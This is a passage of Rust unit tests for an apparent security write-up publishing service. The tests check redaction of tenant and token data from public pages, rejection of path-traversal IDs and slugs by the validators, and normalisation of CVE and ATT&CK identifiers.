        assert!(!transition_allowed(Published, Draft));
    }

    #[test]
    fn public_page_copies_only_allow_listed_fields() {
        let mut w = sample();
        w.attempt_ids = vec!["att_0123456789abcdef01234567".into()];
        w.embargo_until = Some(5_000);
        let mut facts = PageFacts::default();
        facts.advisories.insert("FOILED-DEMO-0001".into(), 2_000);
        let p = public_page(&w, &facts, 3_000);
        assert_eq!(p.visible_from, 5_000);
        assert_eq!(p.cves[0].wording, "we assess as");
        let text = serde_json::to_string(&p).unwrap();
        assert!(!text.contains("tenant-demo"));
        assert!(!text.contains("att_"));
        assert!(!text.contains("tok_author"));
        assert!(!page_leaks(&p, &["tenant-demo".into()]));
        let kinds: Vec<_> = p.timeline.iter().map(|t| t.kind).collect();
        assert_eq!(
            kinds,
            vec![
                TimelineKind::FirstSeen,
                TimelineKind::AdvisoryPublished,
                TimelineKind::Published
            ]
        );
        assert!(!page_leaks(&p, &["t1".into()]), "T1190 is not tenant t1");
        assert!(contains_token("seen at t1.", "t1"));
        assert!(!contains_token("t10 and xt1", "t1"));
        let mut leaky = p.clone();
        leaky.summary = "seen at tenant-demo".into();
        assert!(page_leaks(&leaky, &["tenant-demo".into()]));
    }

    #[test]
    fn ids_and_slugs() {
        assert!(valid_writeup_id(&writeup_id("x")));
        assert!(!valid_writeup_id("wu_../../x"));
        assert!(valid_slug("demo-app-2099"));
        assert!(!valid_slug("Demo"));
        assert!(!valid_slug("a--b"));
        assert!(!valid_slug("../x"));
        assert_eq!(
            normalise_cve("cve-2099-0001").as_deref(),
            Some("CVE-2099-0001")
        );
        assert_eq!(normalise_cve("CVE-99-1"), None);
        assert_eq!(
            normalise_technique("t1059.004").as_deref(),
            Some("T1059.004")
        );
        assert_eq!(normalise_technique("T19"), None);
    }
}
